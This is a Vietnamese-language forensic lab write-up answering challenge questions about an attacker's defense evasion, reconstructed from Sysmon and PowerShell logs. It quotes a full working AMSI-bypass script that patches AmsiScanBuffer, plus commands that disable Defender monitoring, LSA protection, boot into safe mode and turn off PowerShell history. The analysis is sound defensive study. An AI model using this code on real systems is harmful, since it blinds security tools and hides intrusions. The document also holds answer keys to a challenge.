# Mô tả

Byte Doctor Reyes is investigating a stealthy post-breach attack where several expected security logs and Windows Defender alerts appear to be missing. He suspects the attacker employed defense evasion techniques to disable or manipulate security controls, significantly complicating detection efforts.

Using the exported event logs, your objective is to uncover how the attacker compromised the system's defenses to remain undetected.

# Phân tích

## Q1

**The attacker disabled LSA protection on the compromised host by modifying a registry key. What is the full path of that registry key?**

Lên mạng tìm [LSA protection registry key](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) 

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`

Trong các file log có sysmon log, filter event ID 12,13,14 để xem đã chỉnh những gì

```
The description for Event ID 13 from source Microsoft-Windows-Sysmon cannot be found. Either the component that raises this event is not installed on your local computer or the installation is corrupted. You can install or repair the component on the local computer.

If the event originated on another computer, the display information had to be saved with the event.

The following information was included with the event: 

T1101
SetValue
2025-04-10 06:29:16.718
EV_RenderedValue_3,00
9540
C:\WINDOWS\system32\reg.exe
HKLM\System\CurrentControlSet\Control\Lsa\RunAsPPL
DWORD (0x00000000)
DESKTOP-M3AKJSD\User

The message resource is present but the message was not found in the message table
```

Đây là hành vi tắt LSA protection bằng cách set giá trị của `RunAsPPL`= 0

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`

## Q2

**Which PowerShell cmdlet controls Windows Defender?**

Google thì biết được các lệnh điều khiển Windows Defender phổ biến

```
Add-MpPreference: Modifies Windows Defender settings, allowing you to add exclusions, define default actions for threats, and more. 
Set-MpPreference: Configures Windows Defender scan and update preferences. 
Get-MpPreference: Retrieves the current configuration and settings for Windows Defender. 
Get-MpComputerStatus: Gets the current status of Windows Defender, including whether it's running, the last scan, and other relevant information. 
Start-MpScan: Starts a scan of the computer using Windows Defender. 
```

Trong windows powershell operational log filter 4104 rồi kiểm tra các lệnh powershell đã được chạy

```
Creating Scriptblock text (1 of 1):
Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true

ScriptBlock ID: 931bac4b-90da-4221-bbaf-0526c190f4c5
Path: 
```

Vào 1:37:05 hacker đã tắt tính năng scan của Defender

`Set-MpPreference`

## Q3

**The attacker loaded an AMSI patch written in PowerShell. Which function in the amsi.dll is being patched by the script to effectively disable AMSI? Hint: The script in question imports `kernel32.dll`**

```powershell
Creating Scriptblock text (1 of 1):
function Disable-Protection {
    $k = @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static bool Patch() {
        IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");
        if (h == IntPtr.Zero) return false;
        IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
        if (a == IntPtr.Zero) return false;
        UInt32 oldProtect;
        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
        byte[] patch = { 0x31, 0xC0, 0xC3 };
        Marshal.Copy(patch, 0, a, patch.Length);
        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
    }
}
"@
    Add-Type -TypeDefinition $k
    $result = [P]::Patch()
    if ($result) {
        Write-Output "Protection Disabled"
    } else {
        Write-Output "Failed to Disable Protection"
    }
}

ScriptBlock ID: a40a685c-b1e5-495e-b69a-3542da1e6c22
Path: 
```

Vào 1:37:47 hacker chạy một script khác để tắt AMSI(Anti malware scan interface) bằng cách truy xuất địa chỉ hàm `AmsiScanBuffer` trong `amsi.dll`. Đây là hàm mà Windows Defender sử dụng để quét nội dung trong bộ nhớ

```powershell
IntPtr h = GetModuleHandle("amsi.dll");
IntPtr a = GetProcAddress(h, "AmsiScanBuffer");
```

Sau đó 

```powershell
byte[] patch = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
Marshal.Copy(patch, 0, a, patch.Length);
```

`0x31, 0xC0` Đặt kết quả trả về là 0 `AMSIScanResult.CLEAN` rồi sau đó `0xC3` để kết thúc hàm khiến cho các đoạn mã được quét sau khi patch `amsi.dll` đều không gây ra cảnh báo vì tất cả đều clean

`AmsiScanBuffer`

## Q4

**Which command did the attacker use to restart the machine in Safe Mode, (with arguments, without ".exe")?**

Google thì biết được khi muốn restart máy về safe mode thương dùng lệnh `bcdedit /set {current} safeboot minimal` ta có thể tìm kiếm những câu lệnh chứa `bcdedit`, `safeboot` trong log để biết hacker đã làm gì

```
Creating Scriptblock text (1 of 1):
bcdedit /set safeboot network

ScriptBlock ID: 4424e2da-5302-4ba7-9280-a7b70b33e0aa
Path: 
```

Chạy vào 1:38:35

`bcdedit /set safeboot network`

## Q5

**Which PowerShell command did the attacker use to disable PowerShell command history logging?**

```
Creating Scriptblock text (1 of 1):
Set-PSReadlineOption -HistorySaveStyle SaveNothing

ScriptBlock ID: eef9a7e3-fc56-47f7-b44f-2b4e1681d0bc
Path: 
```

Chạy vào 1:38:43

`Set-PSReadlineOption -HistorySaveStyle SaveNothing`